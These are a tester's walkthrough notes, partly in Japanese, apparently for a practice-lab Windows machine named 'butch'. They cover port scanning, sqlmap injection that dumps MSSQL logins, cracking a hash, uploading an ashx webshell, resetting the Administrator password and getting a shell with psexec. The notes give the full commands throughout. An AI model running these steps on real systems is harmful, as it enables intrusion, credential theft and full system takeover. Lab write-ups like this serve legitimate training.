└─$ sudo nmap -Pn -n 192.168.145.63 -p- -sC -sV --min-rate=5000 -oX butch.xml

![[wt image 147.png]]

![[wt image 148.png]]

└─$ sudo gobuster dir -u http://192.168.145.63:450 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -k -x php,html,txt,zip,git -t 20 -b 400,401,403,504,404

http://192.168.145.63:450/dev/

![[wt image 149.png]]

Test for SQLi

![[wt image 150.png]]

sqlmap

└─$ sqlmap -r login-page.txt --dbms=mssql --dbs --technique=t --risk 3 --level 5 --batch

![[wt image 151.png]]

![[wt image 152.png]]

master

└─$ sqlmap -r login-page.txt --dbms=mssql --dbs --technique=t -D master -T sys.sql_logins --dump --risk 3 --level 5 --batch

![[wt image 153.png]]

![[wt image 154.png]]

![[wt image 155.png]]

==🟢butch====🟢データベースのダンプ==

└─$ sqlmap -r login-page.txt --dbms=mssql --dbs --technique=t -D butch --tables --dump --risk 3 --level 5 --batch

![[wt image 156.png]]

\| 1       | butch    | e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267 |

Crack Hash

└─$ hashid e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267

![[wt image 157.png]]

└─$ hashcat -m 1400 'e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force

![[wt image 158.png]]

![[wt image 159.png]]

e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267:awesomedude

name butch

passkey awesomedude

![[wt image 160.png]]

![[wt image 161.png]]

![[wt image 162.png]]

![[wt image 163.png]]

アップロードはできるがセキュリティによりアクセスできないため、.aspをアップロードする方法に移行する

https://github.com/yangbaopeng/ashx_webshell/blob/master/shell.ashx

上記のファイルを修正せずアップロードし、アクセス

![[wt image 164.png]]

成功

![[wt image 165.png]]

net user Administrator P@ssw0rd

![[wt image 166.png]]

└─$ impacket-psexec 'Administrator:P@ssw0rd@192.168.145.63'

![[wt image 167.png]]

![[wt image 168.png]]